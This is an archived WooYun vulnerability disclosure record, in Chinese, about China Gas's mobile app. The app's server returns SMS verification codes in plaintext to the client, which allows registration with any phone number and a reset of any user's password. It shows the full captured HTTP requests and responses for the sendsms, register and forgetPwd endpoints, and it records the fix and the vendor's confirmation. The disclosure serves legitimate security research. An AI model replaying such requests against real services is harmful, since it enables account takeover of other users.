{"id": 81478, "wybug_id": "wooyun-2015-0153573", "wybug_title": "中燃惠生活客户端设计不当导致可重置任意用户密码/任意手机号注册", "wybug_corp": "中国燃气控股有限公司", "wybug_author": "qmm0523", "wybug_date": "2015-11-25 16:34", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "设计错误", "客户端程序设计错误", "搞笑有爱"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-29：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 可以重置任何用户的密码 详细说明：  程序员安全意识过于薄弱，当发送短信验证码时，服务器将短信验证码直接明文发送到客户端，并由客户端完成短信验证码的比对   漏洞证明：  先来注册一个账号吧通过抓取数据包 得知用户注册接口地址POST内容\nPOST http://**.**.**.**:8081/zhongran/sendsms HTTP/1.1Charset: UTF-8User-Agent: Mozilla/5.0 (Linux; U; Mobile; Android 5.1.1; )Accept: */*x-mas-app-info: aaahg10001/publicConnection: Keep-AliveAccept-Encoding: gzip, deflateContent-Length: 18Content-Type: application/x-www-form-urlencodedHost: **.**.**.**:8081mobile=13000000000\n服务器返回如下\n{\"status\":1,\"data\":\"5177\",\"option\":{\"method\":\"POST\",\"url\":\"http://**.**.**.**/controller/sms/sendSms.do\",\"Enctype\":\"application/json\",\"Cookie\":\"true\",\"agent\":false,\"Body\":{\"mobile\":\"13000000000\",\"code\":5177}}}\n看见没 直接就告诉了我们短信验证码是多少我们用这个验证码在客户端注册  抓包如下POST\nPOST http://**.**.**.**:8081/zhongran/register HTTP/1.1appverify: md5=31e71cbac25189086aabcb1803c2d420;ts=1447225315731Charset: UTF-8User-Agent: Mozilla/5.0 (Linux; U; Mobile; Android 5.1.1;NX505J Build/FRF91 )Accept: */*x-mas-app-info: aaahg10001/publicConnection: Keep-AliveAccept-Encoding: gzip, deflateContent-Length: 41Content-Type: application/x-www-form-urlencodedHost: **.**.**.**:8081mobile=13000000000&pwd=123321&inviteCode=\nResponse\n{\"status\":1,\"message\":\"注册成功！\",\"data\":{\"id\":225187,\"mobile\":\"13000000000\",\"userName\":null,\"pwd\":\"c8837b23ff8aaa8a2dde915473ce0991\",\"gasAccount\":null,\"userCode\":\"024241100225187\",\"userState\":0,\"level\":0,\"birthday\":null,\"sex\":0,\"addressId\":0,\"workUnit\":null,\"unitTel\":null,\"familyTel\":null,\"detailAddress\":null,\"email\":null,\"registerTime\":\"2015-11-11 15:02:42\",\"inviter\":null,\"inviteCode\":\"\",\"lastLoginTime\":null,\"lastLoginIp\":null,\"allIntegral\":0,\"allConsume\":0,\"realName\":null,\"balance\":0,\"userArea\":null,\"userAddress\":null,\"userPhone\":null,\"userSex\":0,\"stairs\":null,\"elevator\":null,\"gasCompanyId\":null,\"gasCompanyName\":null,\"gasOutletsId\":null,\"gasOutletsName\":null,\"workUnits\":null,\"position\":null,\"workPhone\":null,\"homePhone\":null,\"idCard\":null,\"createTime\":null,\"updateTime\":null,\"removed\":null,\"footprint\":0,\"integral\":0,\"orderGasNo\":null,\"gasCardCode\":null,\"userType\":null,\"contacts\":null,\"gasCardState\":null,\"operatorId\":null,\"payType\":null,\"updatePerson\":null,\"remark\":null,\"myInvite\":null,\"orderCardNo\":null,\"oldPwd\":null,\"newPwd\":null,\"newMobile\":null,\"growValue\":0,\"content\":null,\"userId\":0,\"integralSource\":null,\"recordTime\":null,\"state\":0,\"payfee\":0},\"option\":{\"method\":\"POST\",\"url\":\"http://**.**.**.**/controller/appUser/register.do\",\"Enctype\":\"application/json\",\"Cookie\":\"true\",\"agent\":false,\"Body\":{\"mobile\":\"13000000000\",\"pwd\":\"123321\",\"inviteCode\":\"\"}}}\n可见，获取验证码完全是多余的，直接提交用户名密码即可完成注册再来试一下重置密码 post\nPOST http://**.**.**.**:8081/zhongran/sendsms HTTP/1.1Charset: UTF-8User-Agent: Mozilla/5.0 (Linux; U; Mobile; Android 5.1.1; )Accept: */*x-mas-app-info: aaahg10001/publicConnection: Keep-AliveAccept-Encoding: gzip, deflateContent-Length: 18Content-Type: application/x-www-form-urlencodedHost: **.**.**.**:8081mobile=13000000000\n返回值:\n{\"status\":1,\"data\":\"3178\",\"option\":{\"method\":\"POST\",\"url\":\"http://**.**.**.**/controller/sms/sendSms.do\",\"Enctype\":\"application/json\",\"Cookie\":\"true\",\"agent\":false,\"Body\":{\"mobile\":\"13000000000\",\"code\":3178}}}\n依旧返回了短信验证码发送数据包重置密码\nPOST http://**.**.**.**:8081/zhongran/forgetPwd HTTP/1.1Charset: UTF-8Accept: */*x-mas-app-info: aaahg10001/publicConnection: Keep-AliveAccept-Encoding: gzip, deflateContent-Length: 39Content-Type: application/x-www-form-urlencodedHost: **.**.**.**:8081code=3178&mobile=13000000000&pwd=321123\n返回\n{\"status\":1,\"message\":\"修改密码成功！\",\"option\":{\"method\":\"POST\",\"url\":\"http://**.**.**.**/controller/appUser/forgetPwd.do\",\"Enctype\":\"application/json\",\"Cookie\":\"true\",\"agent\":false,\"Body\":{\"code\":\"3178\",\"mobile\":\"13000000000\",\"pwd\":\"321123\"}}}\n修改密码成功！   修复方案：  在服务器端比对短信验证码     版权声明：转载请注明来源 qmm0523@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-11-26 20:17 厂商回复： 感谢提交，我们尽快修复 最新状态： 2015-12-11：已修复  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}